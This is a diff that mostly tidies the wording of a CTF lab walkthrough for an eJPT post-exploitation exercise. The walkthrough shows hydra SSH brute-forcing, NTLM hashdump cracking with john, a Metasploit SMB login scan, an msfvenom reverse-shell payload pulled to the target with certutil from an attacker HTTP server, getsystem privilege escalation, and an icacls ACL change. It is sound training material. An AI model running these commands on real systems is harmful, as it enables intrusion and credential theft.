@@ -1,51 +1,51 @@
-# eJPT : Host & Network Penetration Testing: Post-Exploitation CTF 2
+# eJPT: Host & Network Penetration Testing: Post-Exploitation CTF 2
 
 https://medium.com/@murat_kuzucu/ejpt-host-network-penetration-testing-post-exploitation-ctf-2-105fdf6fc548
 
-Let’s start with nmap scan on our target.
+Let’s start with an nmap scan on our target.
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="132" loading="eager" role="presentation" src="../../../_resources/1_rreYLSAnN2ppOVLFO8h_8Q.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="132" loading="eager" role="presentation" src="resources/1_rreYLSAnN2ppOVLFO8h_8Q.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-ssh,smb,rdp services are open.
+SSH,smb,rdp services are open.
 
 “**Flag 1:** An insecure ssh user named **alice** lurks in the system.”
 
-lets do bruteforce attack on ssh.
+Let's do a brute-force attack on SSH.
 
 ```
 hydra -l alice -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target.ine.local ssh
 ```
 
-we have found credentials.
+We have found credentials.
 
-so lets take look on ssh service.
+So let's take a look at the SSH service.
 
 ```
 ssh alice<span style="color: rgb(170, 13, 145);">@target</span>.ine.local
 ```
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="285" loading="lazy" role="presentation" src="../../../_resources/1_SXIlsglZforfJ4vvB6mnqQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="285" loading="lazy" role="presentation" src="resources/1_SXIlsglZforfJ4vvB6mnqQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-we got our first flag
+We got our first flag
 
 “**Flag 2:** Using the hashdump file discovered in the previous challenge, can you crack the hashes and compromise a user?”
 
-lets download hashdump file via ssh with scp.
+Let's download the hashdump file via SSH with scp.
 
 ```
 scp alice<span style="color: rgb(170, 13, 145);">@target</span>.ine.<span style="color: rgb(170, 13, 145);">local</span>:hashdump.txt hashdump.txt
 ```
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="374" loading="lazy" role="presentation" src="../../../_resources/1_n3T9rgrkNaojRAvfncraRw.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="374" loading="lazy" role="presentation" src="resources/1_n3T9rgrkNaojRAvfncraRw.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-we have a hash file like this.
+We have a hash file like this.
 
-we can code a python script to seperate usernames and hashes
+We can code a Python script to separate usernames and hashes
 
 ```
 <span style="color: rgb(170, 13, 145);">def</span> extract_ntlm_hashes(<span style="color: rgb(92, 38, 153);">input_file, ntlm_output_file, username_output_file, user_hash_output_file</span>):
     <span style="color: rgb(196, 26, 22);">"""
-    Extracts usernames and NTLM hashes from the input file and writes them to separate files and combined user:hash file.
+    Extracts usernames and NTLM hashes from the input file and writes them to separate files and a combined user: hash file.
     :param input_file: The name of the input file containing the full hashdump.
     :param ntlm_output_file: The name of the output file for NTLM hashes.
     :param username_output_file: The name of the output file for usernames.
@@ -85,19 +85,19 @@ extract_ntlm_hashes(input_filename, ntlm_output_filename, username_output_filena
 python3 script.py
 ```
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="99" loading="lazy" role="presentation" src="../../../_resources/1_h1fYqQuKFIXCr7VyJuqR1g.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="99" loading="lazy" role="presentation" src="resources/1_h1fYqQuKFIXCr7VyJuqR1g.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-now we have three files, lets crack ntlm-hashes with john-the-ripper
+Now we have three files, let's crack NTLM-hashes with john-the-ripper
 
 ```
 john --format=nt --wordlist=/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ntlm_hashes.txt
 ```
 
-we have cracked two hashes lets write on a file and use for bruteforce.
+We have cracked two hashes, let's write to a file and use it for brute-force.
 
-there is an metasploit module that named smb_login,
+There is a Metasploit module named smb_login,
 
-lets use with our usernames,passwords files.
+Let's use our usernames, passwords files.
 
 set rhosts target.ine.local
 
@@ -109,27 +109,27 @@ set CreateSession true
 
 run
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="153" loading="lazy" role="presentation" src="../../../_resources/1_rFH42NaJyi6iz4B7XYGb0w.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="153" loading="lazy" role="presentation" src="resources/1_rFH42NaJyi6iz4B7XYGb0w.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-we also have found correct credentials for these users.
+We have also found the correct credentials for these users.
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="661" height="342" loading="lazy" role="presentation" src="../../../_resources/1_-h-MqTQjdUYS-QGUCDlsoQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 661px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="661" height="342" loading="lazy" role="presentation" src="resources/1_-h-MqTQjdUYS-QGUCDlsoQ.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 661px; max-width: 100%; height: auto;">
 
 nothing useful here.
 
-lets try ssh with user david.
+Let's try SSH with user david.
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="591" loading="lazy" role="presentation" src="../../../_resources/1_xq4vdF4T__PzG69t8hOKhg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="591" loading="lazy" role="presentation" src="resources/1_xq4vdF4T__PzG69t8hOKhg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-flag3:“Can you escalate privileges and read the flag in C://Windows//System32//config directory?”
+flag3: “Can you escalate privileges and read the flag in C://Windows//System32//config directory?”
 
-lets create msfvenom shell:
+Let's create msfvenom shell:
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=1234 -f exe > shell.exe
 ```
 
-so we going to transfer our shell file with certutil and python3 http.server
+So we're going to transfer our shell file with certutil and python3 http.server
 
 ```
 <span style="color: rgb(0, 116, 0);">#on local</span>
@@ -138,9 +138,9 @@ python3 -m http.server 80
 certutil.exe -urlcache -<span style="color: rgb(92, 38, 153);">split</span> -f http://<localmachine>/shell.exe shell.exe
 ```
 
-after transfering our file in C:\\Temp\\ directory,
+after transferring our file to C:\\Temp\\ directory,
 
-lets use metasploit multi/handler
+Let's use Metasploit multi/handler
 
 set payload windows/meterpreter/reverse_tcp
 
@@ -148,34 +148,34 @@ set lhost,lport
 
 run
 
-and, run shell.exe
+and run shell.exe
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="132" loading="lazy" role="presentation" src="../../../_resources/1_AFsW1MIelID9ck8z6apqBg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;"> <img alt="" class="bh ko mr c jop-noMdConv" width="700" height="94" loading="lazy" role="presentation" src="../../../_resources/1_ERxaC97K4dUc_yivUEox4g.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="132" loading="lazy" role="presentation" src="resources/1_AFsW1MIelID9ck8z6apqBg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;"> <img alt="" class="bh ko mr c jop-noMdConv" width="700" height="94" loading="lazy" role="presentation" src="resources/1_ERxaC97K4dUc_yivUEox4g.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-we can try easy method to escalate our privilege getsystem. and it works!!
+We can try an easy method to escalate our privilege to get the system. And it works!!
 
 “Can you escalate privileges and read the flag in C://Windows//System32//config directory?”
 
-i have answered this question but, its buggy.
+I have answered this question, but it's buggy.
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="699" height="359" loading="lazy" role="presentation" src="../../../_resources/1_dwhR8m6kyc3ORflBb2z9Ww.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="699" height="359" loading="lazy" role="presentation" src="resources/1_dwhR8m6kyc3ORflBb2z9Ww.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
 flag4: “Looks like the flag present in the Administrator’s home denies direct access.”
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="690" height="675" loading="lazy" role="presentation" src="../../../_resources/1_uBeYw_RTmwF_K23UGBCG-A.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="690" height="675" loading="lazy" role="presentation" src="resources/1_uBeYw_RTmwF_K23UGBCG-A.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-we cant change directory to flag because
+We can't change the directory to flag because
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="280" loading="lazy" role="presentation" src="../../../_resources/1_HKK5xbldZuzBwzC2NcxxAA.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="280" loading="lazy" role="presentation" src="resources/1_HKK5xbldZuzBwzC2NcxxAA.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
 SYSTEM user permission denied.
 
-we can change it:
+We can change it:
 
 ```
 icacls flag /remove:d <span style="color: rgb(196, 26, 22);">"NT AUTHORITY\SYSTEM"</span>
 ```
 
-<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="471" loading="lazy" role="presentation" src="../../../_resources/1_XP14qHy_CQTpPkeSpLOSMg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
+<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="471" loading="lazy" role="presentation" src="resources/1_XP14qHy_CQTpPkeSpLOSMg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">
 
-we can read it now.
+We can read it now.
